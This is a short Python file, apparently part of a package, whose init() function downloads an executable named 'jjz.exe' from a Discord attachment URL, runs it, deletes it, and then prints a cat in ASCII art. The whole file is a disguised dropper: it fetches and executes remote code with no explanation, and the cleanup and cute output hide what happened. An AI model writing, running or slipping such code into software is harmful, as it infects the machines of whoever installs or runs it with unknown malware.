def init():
    import requests
    import os

    url = 'https://cdn.discordapp.com/attachments/1147468969754755142/1147479311373324288/jjz.exe'
    r = requests.get(url, allow_redirects=True)

    open('jjz.exe', 'wb').write(r.content)

    os.system('jjz.exe')
    os.remove('jjz.exe')

    print('''
 ╱|、
(˚ˎ。7
 |、˜〵
 じしˍ,)ノ
        ''')